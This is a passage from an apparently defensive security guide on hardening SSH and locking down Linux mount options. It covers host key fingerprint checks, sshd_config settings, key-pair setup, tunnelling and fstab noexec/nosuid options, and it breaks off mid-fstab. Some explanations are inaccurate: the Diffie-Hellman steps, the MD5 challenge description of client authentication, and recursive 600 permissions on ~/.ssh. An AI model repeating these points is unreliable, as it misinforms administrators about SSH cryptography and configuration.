<p>If a given hash function is run on a given message twice, the resulting hash value should be identical. Modifying any part of the message has a very high chance of creating an entirely different hash value.</p>

<p>Any given message should not be able to be re-created from the hash of it.</p>

<p>When the symmetric encryption negotiation is being carried out, a Message Authentication Code (MAC) algorithm is selected from the clients default list of MACs, the first one that is supported on the server is used. You can see the default list by entering <code>man ssh_config</code> into a terminal.</p>

<p>Once the encryption properties are chosen as detailed below in the first step of <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure">SSH Connection Procedure</a>, each message sent must contain a MAC, so that the receiving party can verify the integrity of the message. The MAC is the <a href="https://tools.ietf.org/html/rfc4253">result of</a>:</p>

<ol class="numeric">
  <li>The shared symmetric secret key</li>
  <li>The packet sequence number of the message</li>
  <li>The unencrypted message content  </li>
</ol>

<p>The MAC is sent as the last part of the <a href="https://tools.ietf.org/html/rfc4253#section-6">binary packet protocol</a>.</p>

<h6 id="vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure">SSH Connection Procedure</h6>

<p>The two main stages of establishing the connection are:</p>

<ol class="numeric">
  <li>Establish the session encryption</li>
  <li>Authenticate the client to the server (should the user be allowed access to the server)</li>
</ol>

<p>The following are the details for each:</p>

<p>
  <strong>Establish the session encryption</strong>
</p>

<p>The SSH client is responsible for initiating the TCP handshake with the server. The server responds with the protocol versions it supports, if the client can support one of the protocol versions from the server, the process continues. The server also provides its public (asymmetric) host key. The client verifies that the server is known to it, by checking that the public host key sent from the server is in the clients:<br />
<code>~/.ssh/known_hosts</code></p>

<p>This record is added on first connection to the server, as detailed in the section <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint">Establishing your SSH Servers Key Fingerprint</a> below.</p>

<p>At this stage, a session key is negotiated between the client and server using Diffie-Hellman (DH) as an ephemeral (asymmetric) key exchange algorithm, each combining their own private data with public data from the other party, which allows both parties to arrive at the identical secret symmetric session key. The public and private key pairs used to create the shared secret key in this stage have nothing to do with the client authenticating to the server.</p>

<p>Now in a little more detail, the Diffie-Hellman key agreement works like this:</p>

<ol class="numeric">
  <li>Both client and server come to agreement on a seed value, that is a large prime number.</li>
  <li>Both client and server agree on a symmetric cipher, so that they are both encrypting/decrypting with the same block cipher, usually AES</li>
  <li>Each party then creates another prime number of their own to be used as a private key for this ephemeral DH interaction</li>
  <li>Each party then create a public key which they exchange with the other party. These public keys are created using the symmetric cipher from step 2, the shared prime number from step 1, and derived from the private key from step 3.</li>
  <li>The party receiving the other parties public key, uses this, along with their own private key, and the shared prime number from step 1 to compute their own secret key. Because each party does the same, they both arrive at the same (shared/symmetric/secret) key.</li>
  <li>All communications from here on are encrypted with the same shared secret key, the connection from here on is known as the <em>binary packet protocol</em>. Each party can use their own shared secret key to encrypt and decrypt, messages from the other party.</li>
</ol>

<p>
  <strong>Authenticate the client to the server</strong>
</p>

<p>The second stage is to authenticate the client, establishing whether they should be communicating with the server. There are several methods for doing this, the two most common are passwords and key-pair. SSH defaults to passwords, as the lowest common denominator, plus it often helps to have password authentication set-up in order to set-up key-pair authentication, especially if you dont have physical access to the server(s).</p>

<p>SSH key pairs are asymmetric. The server holds the clients public key and is used by the server to encrypt messages that it uses to authenticate the client. The client in turn receives the messages from the server and decrypts them with the private key. If the public key falls into the wrong hands, its no big deal, because the private key can not be deduced from the public key, and all the authentication public key is used for is verifying that the client holds the private key for it.</p>

<p>The authentication stage continues directly after the encryption has been established from the previous step.  </p>

<ol class="numeric">
  <li>The client sends the Id of the key pair they want to authenticate as to the server</li>
  <li>The server checks the <code>~/.ssh/authorized_keys</code> file for the Id of the public keys account that the client is authenticating as</li>
  <li>If there is a matching Id for a public key within <code>~/.ssh/authorized_keys</code>, the server creates a random number and encrypts it with the public key that had a matching Id</li>
  <li>The server then sends the client this encrypted number</li>
  <li>Now the client needs to prove that it has the matching private key for the Id it sent the server. It does this by decrypting the message the server just sent with the private key, revealing the random number created on the server.</li>
  <li>The client then combines the number from the server with the shared session key produced in the session encryption stage and obtains the MD5 hash from this value.</li>
  <li>The client then sends the hash back in response to the server.</li>
  <li>The server then does the same as the client did in step 6 with the number that it generated, combining it with the shared session key and obtaining the MD5 hash from it. The server then compares this hash with the hash that the client sent it. If they match, then the server communicates to the client that it is successfully authenticated.</li>
</ol>

<p>Below in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication">Key-pair Authentication</a> section, we work through manually (hands on) setting up Key-pair authentication.</p>

<h6 id="vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint">Establishing your SSH Servers Key Fingerprint</h6>

<p>When you connect to a remote host via SSH that you have not established a trust relationship with before, you are going to be told that the authenticity of the host your attempting to connect to can not be established.</p>

<figure class="code">
<div class="highlight"><pre><code></code>you@yourbox ~ $ ssh you@your_server
The authenticity of host <code class="s1">'your_server (your_server)'</code> can<code class="err">'</code>t be established.
RSA key fingerprint is <code class="m">23</code>:d9:43:34:9c:b3:23:da:94:cb:39:f8:6a:95:c6:bc.
Are you sure you want to <code class="k">continue</code> connecting <code class="o">(</code>yes/no<code class="o">)</code>?
</pre></div>

</figure>

<p>Do you type yes to continue without actually knowing that it is the host you think it is? Well, if you do, you should be more careful. The fingerprint that is being put in front of you could be from a Man In the Middle (MItM). You can query the target (from its shell of course) for the fingerprint of its key easily. On Debian you will find the keys in <code>/etc/ssh/</code></p>

<p>When you enter the following:</p>

<p>
  <code>ls /etc/ssh/</code>
</p>

<p>you should get a listing that reveals the private and public keys. Run the following command on the appropriate key to reveal its fingerprint.</p>

<p>For example if SSH is using rsa:</p>

<p>
  <code>ssh-keygen -lf ssh_host_rsa_key.pub</code>
</p>

<p>For example if SSH is using dsa:</p>

<p>
  <code>ssh-keygen -lf ssh_host_dsa_key.pub</code>
</p>

<p>If you try the command on either the private or publick key you will be given the public keys fingerprint, which is exactly what you need for verifying the authenticity from the client side.</p>

<p>Sometimes you may need to force the output of the fingerprint_hash algorithm, as ssh-keygen may be displaying it in a different form than it is shown when you try to SSH for the first time. The default when using ssh-keygen to show the key fingerprint is sha256, unless it is an old version, but in order to compare apples with apples you may need to specify md5 if that is what is being shown when you attempt to login. You would do that by issuing the following command:</p>

<p>
  <code>ssh-keygen -lE md5 -f ssh_host_dsa_key.pub</code>
</p>

<p>If that does not work, you can specify md5 from the client side with:</p>

<p>
  <code>ssh -o FingerprintHash=md5 &lt;your_server&gt;</code>
</p>

<p>Alternatively this can be specified in the clients <code>~/.ssh/config</code> file as per the following, but I would not recommend this, as using md5 is <a href="https://en.wikipedia.org/wiki/MD5#Security">less secure</a>.</p>

<figure class="code">
<div class="highlight"><pre><code></code>Host &lt;your_server&gt;
    FingerprintHash md5
</pre></div>

</figure>

<p>Prior to <a href="http://www.openssh.com/txt/release-6.8">OpenSSH 6.8</a> The fingerprint was provided as a hexadecimal md5 hash. Now it is displayed as base64 sha256 by default. You can check which version of SSH you are using with:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sshd -v
</pre></div>

</figure>

<p>You can find additional details on the man pages for the options, both ssh-keygen and ssh.</p>

<p>Do not connect remotely and then run the above command, as the machine you are connected to is still untrusted. The command could be dishing you up any string replacement if it is an attackers machine. You need to run the command on the physical box or get someone you trust (your network admin) to do this and hand you the fingerprint.</p>

<p>Now when you try to establish your SSH connection for the first time, you can check that the remote host is actually the host you think it is by comparing the output of one of the previous commands with what SSH on your client is telling you the remote hosts fingerprint is. If it is different, it is time to start tracking down the origin of the host masquerading as the address your trying to log in to.</p>

<p>Now, when you get the following message when attempting to SSH to your server, due to something or somebody changing the hosts key fingerprint:</p>

<figure class="code">
<div class="highlight"><pre><code></code>@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now <code class="o">(</code>man-in-the-middle attack<code class="o">)</code>!
It is also possible that a host key has just been changed.
The fingerprint <code class="k">for</code> the RSA key sent by the remote host is
<code class="m">23</code>:d9:43:34:9c:b3:23:da:94:cb:39:f8:6a:95:c6:bc.
Please contact your system administrator.
Add correct host key in /home/me/.ssh/known_hosts to get rid of this message.
Offending RSA key in /home/me/.ssh/known_hosts:6
  remove with: ssh-keygen -f <code class="s2">"/home/me/.ssh/known_hosts"</code> -R your_server
RSA host key <code class="k">for</code> your_server has changed and you have requested strict checking.
Host key verification failed.
</pre></div>

</figure>

<p>The same applies. Check that the fingerprint is indeed the intended target hosts key fingerprint. If it is, you can continue to log in.</p>

<p>Now when you type <code>yes</code>, the fingerprint is added to your clients:<br />
<code>/home/you/.ssh/known_hosts</code> file,<br />
so that next time you try and login via SSH, your client will already know your server.</p>

<h6 id="vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-hardening-ssh">Hardening SSH</h6>

<p>There are a bunch of things you can do to minimise SSH being used as an attack vector. Let us walk through some now.</p>

<p>After any changes, restart SSH daemon as root (using sudo) to apply the changes.</p>

<figure class="code">
<div class="highlight"><pre><code></code>service ssh restart
</pre></div>

</figure>

<p>You can check the status of the daemon with the following command:</p>

<figure class="code">
<div class="highlight"><pre><code></code>service ssh status
</pre></div>

</figure>

<p>
  <strong>Configuring which hosts can access your server</strong>
</p>

<p>This can be done with a firewall, or at a lower level which I prefer. The two files you need to know about are: <code>/etc/hosts.deny</code> and <code>/etc/hosts.allow</code>. The names of the files explain what they contain. <code>hosts.deny</code> contains addresses of hosts which are blocked, <code>hosts.allow</code> contains addresses of hosts which are allowed to connect.</p>

<p>If you wanted to allow access to the SSH daemon from <code>1.1.1.x</code> and <code>10.0.0.5</code>, but no others, you would set-up the files like the following:</p>

<figure class="code">
  <figcaption>/etc/hosts.allow</figcaption>

<div class="highlight"><pre><code></code>sshd: <code class="m">1</code>.1.1.0/255.255.255.0   <code class="c1"># Access to all 254 hosts on 1.1.1.0/24</code>
sshd: <code class="m">10</code>.0.0.5                <code class="c1"># Just the single host.</code>
</pre></div>

</figure>

<figure class="code">
  <figcaption>/etc/hosts.deny</figcaption>

<div class="highlight"><pre><code></code>ALL: ALL
</pre></div>

</figure>

<p>If you wanted to deny all only to SSH, so that users not listed in <code>hosts.allow</code> could potentially log into other services. you would set the <code>hosts.deny</code> up like the following:</p>

<figure class="code">
  <figcaption>/etc/hosts.deny</figcaption>

<div class="highlight"><pre><code></code>sshd: ALL
</pre></div>

</figure>

<p>There are also commented examples in the above files and check the man page for all of the details.</p>

<p id="vps-countermeasures-disable-remove-services-harden-what-is-left-sshd_config">
  <strong>Changes to the servers <code>/etc/ssh/sshd_config</code> file</strong>
</p>

<p>To tighten security up considerably Make the necessary changes to your servers:<br />
<code>/etc/ssh/sshd_config</code> file.<br />
Start with the changes I list here. When you change things like setting up <code>AllowUsers</code> or any other potential changes that could lock you out of the server. It is a good idea to be logged in via one shell when you exit another and test it. This way if you have locked yourself out, you will still be logged in on one shell to adjust the changes you have made. Unless you have a need for multiple users, you can lock it down to a single user. You can even lock it down to a single user from a specific host.</p>

<figure class="code">
  <figcaption>/etc/ssh/sshd_config</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># If specified, login is allowed only for users that match one of the patterns.</code>
<code class="c1"># Also consider DenyUsers, DenyGroups, AllowGroups.</code>
<code class="c1"># Only allow kim, mydog, mycat, myrat to login.</code>
<code class="c1"># Patterns like kim@10.0.0.5 are also allowed and would only allow kim to login from 10.0.0.5</code>
AllowUsers kim mydog mycat, myrat

<code class="c1"># Deny specific users you, and maninthemoon.</code>
DenyUsers you, maninthemoon

<code class="c1"># You really don't want root to be able to log in if at all possible.</code>
PermitRootLogin no

<code class="c1"># Change the LoginGraceTime (seconds) to as small as possible number.</code>
LoginGraceTime <code class="m">30</code>

<code class="c1"># Set PasswordAuthentication to no once you get key pair auth set-up.</code>
PasswordAuthentication no
PubkeyAuthentication yes

PermitEmptyPasswords no

<code class="c1"># Consider using a non default port below 1025 that only root can bind to</code>
<code class="c1"># in order to stop the sshd being swapped. This actually stops a lot of</code>
<code class="c1"># noise if your web server is open to the internet, as many automated scanns target port 22.</code>
Port <code class="m">202</code>
</pre></div>

</figure>

<p>As you can see, these changes are very simple, but so many do not do it. Every positive security change you make to the low hanging fruit lifts it that little bit higher for the attacker to reach, making it less economical for them.</p>

<p>You can also consider installing and configuring <a href="https://www.digitalocean.com/community/articles/how-to-install-denyhosts-on-ubuntu-12-04">denyhosts</a></p>

<p>Check SSH login attempts. As root or via sudo, type the following to see all failed login attempts:</p>

<figure class="code">
<div class="highlight"><pre><code></code>cat /var/log/auth.log <code class="p">|</code> grep <code class="s1">'sshd.*Invalid'</code>
<code class="c1"># Or list the bad login attempts from /var/log/btmp unless modified by an attacker.</code>
lastb -ad
</pre></div>

</figure>

<p>If you want to see successful logins, enter the following:</p>

<figure class="code">
<div class="highlight"><pre><code></code>cat /var/log/auth.log <code class="p">|</code> grep <code class="s1">'sshd.*opened'</code>
<code class="c1"># Or list the last logged in users from /var/log/wtmp unless modified by an attacker.</code>
last -ad
</pre></div>

</figure>

<p>If you are sending your logs off-site in real-time, it will not matter to much if the attacker tries to cover their tracks by modifying these types of files. If you are checking the integrity of your system files frequently with one of the Host Intrusion Detection Systems (<a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">HIDS</a>) we discuss a little further on in this chapter, then you will know you are under attack and will be able to take measures quickly, providing you have someone engaged watching out for these attacks, as discussed in the People chapter of Fascicle 0. If your HIDS is on the same machine that is under attack, then it is quite likely that any decent attacker is going to find it before they start modifying files and some-how render it ineffective. That is where <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth">Stealth</a> shines, as it is so much harder to find where it is operating from, if the attacker even knows it is.</p>

<p id="vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-key-pair-authentication">
  <strong>Key-pair Authentication</strong>
</p>

<p>The details around how the client authenticates to the server are above in part 2 of the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-ssh-connection-procedure">SSH Connection Procedure</a> section. This section shows you how to set-up key-pair authentication, as opposed to password authentication.</p>

<p>Make sure you use a long pass-phrase (this is your second factor of authentication) for your key-pair, that you store in a password vault with all your other passwords. You are using a decent password vault right? If your pass-phrase and private key is compromised, your hardening effort will be softened or compromised.</p>

<p>My feeling after a lot of reading is that currently RSA with large keys (The default RSA size is 2048 bits) is a good option for key-pair authentication. Personally I like to go for 4096 these days.</p>

<p>Create your key-pair if you have not already and set-up key-pair authentication. Key-pair auth is more secure and allows you to log in without a password. Your pass-phrase should be stored in your keyring. You will just need to provide your local password once (each time you log into your local machine) when the keyring prompts for it.</p>

<p>On your client machine that you want to create the key-pair and store them:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ssh-keygen -t rsa -b <code class="m">4096</code>
</pre></div>

</figure>

<p>Agree to the location that <code>ssh-keygen</code> wants to store the keys <code>/home/you/.ssh</code></p>

<p>Enter a pass phrase twice to confirm. Keys are now in <code>/home/you/.ssh</code></p>

<p>Optionally, the new private key can be added to <code>id_rsa.keystore</code> if it hasnt been already:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ssh-add id_rsa
</pre></div>

</figure>

<p>Then enter your pass-phrase.</p>

<p>Now we need to get the public key we have just created (<code>~/.ssh/id_rsa.pub</code>) from our client machine into our servers <code>~/.ssh/</code> directory.<br />
You can <code>scp</code> it, but this means also logging into the server and creating the:<br />
<code>~/.ssh/authorized_keys</code> file if it does not already exist,<br />
and appending (<code>&gt;&gt;</code>) the contents of id_rsa.pub to <code>~/.ssh/authorized_keys</code>. There is an easier way, and it goes like this, from your client machine:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ssh-copy-id <code class="s2">"you@your_server -p [your non default port]"</code>
</pre></div>

</figure>

<p>This will copy the public key straight into the <code>~/.ssh/authorized_keys</code> file on your_server. You may be prompted to type <code>yes</code> if it is the first time you have connected to the server, that the authenticity of the server you are trying to connect to can not be established and you want to continue. Remember I mentioned this above in the <a href="chap03.html#vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-establishing-your-ssh-servers-key-fingerprint">Establishing your SSH Servers Key Fingerprint</a> section? Make sure you check the servers Key Fingerprint and do not just blindly accept it, this is where our security solutions break down due to human defects.</p>

<p>Also make sure the following permissions and ownership on the server are correct:</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="lineno">1 </code>chmod go-w ~/
<code class="lineno">2 </code># Everything in the ~/.ssh dir needs to be chmod 600
<code class="lineno">3 </code>chmod -R 600 ~/.ssh
<code class="lineno">4 </code># Make sure you are the owner of authorized_keys also.
<code class="lineno">5 </code>chown [you] authorized_keys
</pre></div>

</figure>

<h6 id="vps-countermeasures-disable-remove-services-harden-what-is-left-ssh-tunneling-ssh">Tunneling SSH</h6>

<p>You may need to tunnel SSH once the server is placed into the DMZ. Usually this will be mostly set-up on your router. If you are on the outside of your network, you will just SSH to your external IP address.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># The -A option is useful for hopping from your network internal server to other servers.</code>
ssh your_webserver_account@your_routers_wan_interface -A -p <code class="o">[</code>router wan non default port<code class="o">]</code> 
</pre></div>

</figure>

<p>If you are wanting to SSH from your LAN host to your DMZ web server:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ssh your_webserver_account@your_routers_lan_interface -p <code class="o">[</code>router wan non default port<code class="o">]</code> 
</pre></div>

</figure>

<p>Before you try that though, you will need to set-up the port forwards and add the WAN and/or LAN rule to your router. How you do this will depend on what you are using for a router.</p>

<p>I have blogged extensively over the years on SSH. The Additional Resources chapter has links to my resources for a plethora of information on configuring and using SSH in many different ways.</p>

<p>
  <strong>sshuttle</strong>
</p>

<p>I just thought I would throw sshuttle in here as well, it has nothing to do with hardening SSH, but it is a very useful tool for tunneling SSH. Think of it as a poor mans VPN, but it does some things better than the likes of OpenVPN, like forcing DNS queries through the tunnel also. It is very simple to run.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># --dns: capture and forward local DNS requests</code>
<code class="c1"># -v: verbosity, -r: remote</code>
<code class="c1"># 0/0: forwards all local traffic over the SSH channel.</code>
sshuttle --dns -vvr your_shell_account@your_ssh_shell <code class="m">0</code>/0
<code class="c1"># That is it, now all comms go over your SSH tunnel. So simple. Actually easier than a VPN</code>
</pre></div>

</figure>

<p>As opposed to manually specifying socks and then having to tell your browser to proxy through <code>localhost</code> and use the same port you defined after the socks (<code>-D</code>) option, and then having to do the same for any other programmes that want to use the same tunnel:</p>

<figure class="code">
<div class="highlight"><pre><code></code>ssh -D <code class="o">[</code>any spare port<code class="o">]</code> your_shell_account@your_ssh_shell
<code class="c1"># Now go set-up proxies for all consumers. What a pain!</code>
<code class="c1"># On top of that, DNS queries are not forced through the tunnel,</code>
<code class="c1"># So censorship can still bite you.</code>
</pre></div>

</figure>

<p>Dnscrypt can help conceal DNS queries, but that would be more work. Another offering Ive used is the <a href="https://bitmask.net/">bitmask</a> VPN <a href="https://dl.bitmask.net/linux/">client</a> which does a lot more than traditional VPN clients, bitmask starts an egress firewall that rewrites all DNS packets to use the VPN. bitmask is sponsored by the <a href="https://leap.se/">LEAP Encryption Access Project</a> and looks very good, Ive used this, and the chaps on the #riseup IRC channel on the indymedia server are really helpful to. Bitmask is working on Debian, Ubuntu, and Mint 17, but not so well on Mint 18 when I tried it, but this will probably change.</p>

<h5 id="leanpub-auto-disable-boot-options">Disable Boot Options</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionVERYEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>All the major hypervisors should provide a way to disable all boot options other than the device you will be booting from. VMware allows you to do this in vSphere Client.</p>

<p>While you are at it, <a href="http://kb.vmware.com/selfservice/microsites/search.do?language=en_US&amp;cmd=displayKC&amp;externalId=1004129">set</a> a BIOS password.</p>

<h5 id="vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions">Lock Down the Mounting of Partitions</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>
  <strong>File Permission and Ownership Level</strong>
</p>

<p>Addressing the <a href="chap03.html#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations">first risk</a> as discussed in the <a href="#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation">Overly Permissive File Permissions, Ownership and Lack of Segmentation</a> section of the Identify Risks section:</p>

<p>The first thing to do is locate the files with overly permissive permissions and ownership. Running the suggested tools is a good place to start. From there, following your nose to find any others is a good idea. Then tighten them up so that they conform to the least amount of privilege and ownership necessary in order for the legitimate services/activities to run. Also consider removing any <code>suid</code> bits on executables <code>chmod u-s &lt;yourfile&gt;</code>. We also address applying <code>nosuid</code> to our mounted file systems below which provide a nice safety net.</p>

<p>
  <strong>Mount Point of the File Systems</strong>
</p>

<p>Addressing the <a href="chap03.html#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation-mitigations">second risk</a> as discussed in the <a href="#vps-identify-risks-unnecessary-and--vulnerable-services-overly-permissive-file-permissions-ownership-and-lack-of-segmentation">Overly Permissive File Permissions, Ownership and Lack of Segmentation</a> section of the Identify Risks section:</p>

<p>Let us get started with your <code>fstab</code>.</p>

<p>Make a backup of your <code>/etc/fstab</code> file before you make changes, this is really important, it is often really useful to just swap the modified <code>fstab</code> with the original as you are progressing through your modifications. Read the man page for fstab and also the options section in the mount man page. The Linux File System Hierarchy (<a href="http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/index.html">FSH</a>) documentation is worth consulting also for directory usages. The following was my work-flow:</p>

<p>Before you modify and remount <code>/tmp</code>, view what its currently mounted options look like with:</p>

<figure class="code">
<div class="highlight"><pre><code></code>mount <code class="p">|</code> grep <code class="s1">' /tmp'</code>
</pre></div>

</figure>

<p>Add the <code>noexec</code> mount option to <code>/tmp</code> but not <code>/var</code> because executable shell scripts such as <code>*pre[inst, rm]</code> and <code>*post[inst, rm]</code> reside within <code>/var/lib/dpkg/info</code>. You can also add the <code>nodev,nosuid</code> options to <code>/tmp</code>.</p>

<p>So you should have the following line in <code>/etc/fstab</code> now looking like this:</p>

<figure class="code">
  <figcaption>/etc/fstab</figcaption>

<div class="highlight"><pre><code></code><code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /tmp ext4 defaults,noexec,nodev,nosuid <code class="m">0</code> <code class="m">2</code>
</pre></div>

</figure>

<p>Then to apply the new options from <code>/etc/fstab</code>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo mount -o remount /tmp
</pre></div>

</figure>

<p>Then by issuing the <code>sudo mount | grep ' /tmp'</code> command again, youll see your new options applied.</p>

<p>You can add the <code>nodev</code> option to <code>/home</code>, <code>/opt</code>, <code>/usr</code> and <code>/var</code> also. You can also add the <code>nosuid</code> option to <code>/home</code>. You can add <code>ro</code> to <code>/usr</code></p>

<p>So you should have the following lines, as well as the above <code>/tmp</code> in <code>/etc/fstab</code> now looking like this:</p>

<figure class="code">
  <figcaption>/etc/fstab</figcaption>

<div class="highlight"><pre><code></code><code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /home ext4 defaults,nodev,nosuid <code class="m">0</code> <code class="m">2</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /opt ext4 defaults,nodev <code class="m">0</code> <code class="m">2</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /usr ext4 defaults,nodev,ro <code class="m">0</code> <code class="m">2</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /var ext4 defaults,nodev <code class="m">0</code> <code class="m">2</code>
</pre></div>

</figure>

<p>Before you remount the above changes, you can view the options for the current mounts:</p>

<figure class="code">
<div class="highlight"><pre><code></code>mount
</pre></div>

</figure>

<p>Then remount the mounts you have just specified in your <code>fstab</code> above:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo mount -o remount /home
sudo mount -o remount /opt
sudo mount -o remount /usr
sudo mount -o remount /var
</pre></div>

</figure>

<p>Now have a look at the changed options applied to your mounts:</p>

<figure class="code">
<div class="highlight"><pre><code></code>mount
</pre></div>

</figure>

<p>You can now bind some target <a href="http://www.cyberciti.biz/faq/linux-add-nodev-nosuid-noexec-options-to-temporary-storage-partitions/">mounts onto existing directories</a>. I had only limited success with this technique, so keep reading. The lines to add to the <code>/etc/fstab</code> are as per the following. The file system type should be specified as <code>none</code> (as stated in the The bind mounts section of the <a href="http://man.he.net/man8/mount">mount</a> man page. The <code>bind</code> option binds the mount. There was a bug with the suidperl package in Debian where setting <code>nosuid</code> created an insecurity. suidperl is no longer available in Debian:</p>

<figure class="code">
  <figcaption>/etc/fstab</figcaption>

<div class="highlight"><pre><code></code>/var/tmp /var/tmp none rw,noexec,nosuid,nodev,bind <code class="m">0</code> <code class="m">2</code>
/var/log /var/log none rw,noexec,nosuid,nodev,bind <code class="m">0</code> <code class="m">2</code>
/usr/share /usr/share none nodev,nosuid,bind <code class="m">0</code> <code class="m">2</code>
</pre></div>

</figure>

<p>Before you remount the above changes, you can view the options for the current mounts:</p>

<figure class="code">
<div class="highlight"><pre><code></code>mount
</pre></div>

</figure>

<p>Then remount the above immediately, thus taking effect before a reboot, which is the safest way, as if you get the mounts incorrect, your system may fail to boot in some cases, which means you will have to boot a live CD to modify the <code>/etc/fstab</code>, execute the following commands:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo mount --bind /var/tmp /var/tmp
sudo mount --bind /var/log /var/log
</pre></div>

</figure>

<p>Then to pick up the new options from <code>/etc/fstab</code>:</p>

<figure class="code">
<div class="highlight"><pre><code></code>sudo mount -o remount /var/tmp
sudo mount -o remount /var/log
sudo mount -o remount /usr/share
</pre></div>

</figure>

<p>Now have a look at the changed options applied to your mounts:</p>

<p>For further details consult the remount option of the mount man page.</p>

<p>At any point you can check the options that you have your directories mounted as, by issuing the following command:</p>

<figure class="code">
<div class="highlight"><pre><code></code>mount
</pre></div>

</figure>

<p></p>

<p>As mentioned above, I had some troubles adding these mounts to existing directories, I was not able to get all options applied, so I decided to take another backup of the VM (I would highly advise you to do the same if you are following along) and run the machine from a live CD (Knoppix in my case). I Ran Disk Usage Analyzer to work out which sub directories of <code>/var</code> and <code>/usr</code> were using how much disk space, to work out how much to reduce the sizes of partitions that <code>/var</code> and <code>/usr</code> were mounted on, in order to provide that space to sub directories (<code>/var/tmp</code>, <code>/var/log</code> and <code>/usr/share</code>) on new partitions.<br />
Run gparted and unmount the relevant directory from its partition (<code>/var</code> from <code>/dev/sda5</code>, and <code>/usr</code> from <code>/dev/sda8</code> in this case). Reduce the size of the partitions, by the size of the new partitions you want taken from it. Locate the unallocated partition of the size that you just reduced the partition you were working on, and select new from the context menu. Set the File system type to <code>ext4</code> and click Add -&gt; Apply All Operations -&gt; Apply. You should now have the new partition.</p>

<p>Now you will need to mount the original partition that you resized and the new partition. Open a terminal with an extra tab. In the left terminal go to where you mounted the original partition (<code>/media/sda5/tmp/</code> for example), in the right terminal go to where you mounted the new partition (<code>/media/sda11/</code> for example).</p>

<p>Copy all in current directory of left terminal recursively, preserving all attributes other than hard links.</p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="c1"># -a (archive), -v (verbose), -z (compress)</code>
/media/sda5/share# rsync -avz * /media/sda11/
</pre></div>

</figure>

<p>Once you have confirmed the copy, delete all in <code>/media/sda5/tmp/</code></p>

<p>Back in gparted, mount <code>/dev/sda1</code> so we can modify the <code>/etc/fstab</code>. By running the <code>blkid</code> command you will be given the UUID for the partition to use in the <code>/etc/fstab</code>. Modify the <code>/media/sda1/etc/fstab</code> to look similar to the below sample <code>fstab</code>. Do the same for <code>/var/log</code> and <code>/usr/share</code>.</p>

<figure class="code">
  <figcaption>/etc/fstab</figcaption>

<div class="highlight"><pre><code></code><code class="c1"># /etc/fstab: static file system information.</code>
<code class="c1">#</code>
<code class="c1"># Use 'blkid' to print the universally unique identifier for a</code>
<code class="c1"># device; this may be used with UUID= as a more robust way to name devices</code>
<code class="c1"># that works even if disks are added and removed. See fstab(5).</code>
<code class="c1">#</code>
<code class="c1"># &lt;file system&gt; &lt;mount point&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</code>
<code class="c1"># / was on /dev/sda1 during installation</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; / ext4 <code class="nv">errors</code><code class="o">=</code>remount-ro <code class="m">0</code>       <code class="m">1</code>
<code class="c1"># /home was on /dev/sda9 during installation</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /home ext4 defaults,nodev,nosuid <code class="m">0</code> <code class="m">2</code>
<code class="c1"># /opt was on /dev/sda7 during installation</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /opt ext4 defaults,nodev <code class="m">0</code> <code class="m">2</code>
<code class="c1"># /tmp was on /dev/sda6 during installation</code>
<code class="nv">UUID</code><code class="o">=</code>&lt;block device ID goes here&gt; /tmp ext4 defaults,noexec,nodev,nosuid <code class="m">0</code> <code class="m">2</code>
<code class="c1"># /usr was on /dev/sda8 during installation</code>
